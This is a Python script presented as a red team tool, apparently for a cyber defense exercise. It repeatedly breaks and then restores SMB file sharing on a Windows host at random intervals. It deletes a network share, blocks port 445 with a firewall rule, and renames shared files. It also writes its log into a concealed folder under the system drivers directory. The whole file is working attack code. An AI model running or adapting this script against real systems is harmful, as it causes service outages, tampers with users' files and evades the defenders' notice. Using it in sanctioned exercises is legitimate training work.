# disruptor.py
# Author: Sohan Patel - CDT Charlie Red Team
# SMB disruption tool - cycles through service breaks on random timer

import subprocess, time, random, datetime

LOG = "C:\\Windows\\System32\\drivers\\etc\\sync\\disruptor.log"

def log(msg):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG, "a") as f:
        f.write(f"[{ts}] {msg}\n")

def run(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        log(f"CMD: {cmd} | RC: {r.returncode}")
    except Exception as e:
        log(f"ERROR: {cmd} | {e}")

# Disruption pairs (action, restore)
# Removed net stop Server and icacls as they were too aggressive
PAIRS = [
    (
        'net share "State Secrets" /delete',
        'net share "State Secrets"=C:\\StateSecrets /grant:Everyone,READ'
    ),
    (
        'netsh advfirewall firewall add rule name="blk445" dir=in action=block protocol=tcp localport=445',
        'netsh advfirewall firewall delete rule name="blk445"'
    ),
    (
        'ren C:\\StateSecrets\\miracle_game.mp4 miracle_game.mp4.bak',
        'ren C:\\StateSecrets\\miracle_game.mp4.bak miracle_game.mp4'
    ),
    (
        'ren C:\\StateSecrets\\1980-Ice-Hockey-Tournament-Breakdown.pdf 1980-Ice-Hockey-Tournament-Breakdown.pdf.bak',
        'ren C:\\StateSecrets\\1980-Ice-Hockey-Tournament-Breakdown.pdf.bak 1980-Ice-Hockey-Tournament-Breakdown.pdf'
    ),
]

log("Disruptor started")

while True:
    action, restore = random.choice(PAIRS)

    log(f"DISRUPTING: {action}")
    run(action)

    down_time = random.randint(30, 90)
    log(f"Staying down for {down_time}s")
    time.sleep(down_time)

    log(f"RESTORING: {restore}")
    run(restore)

    up_time = random.randint(10, 30)
    log(f"Staying up for {up_time}s")
    time.sleep(up_time)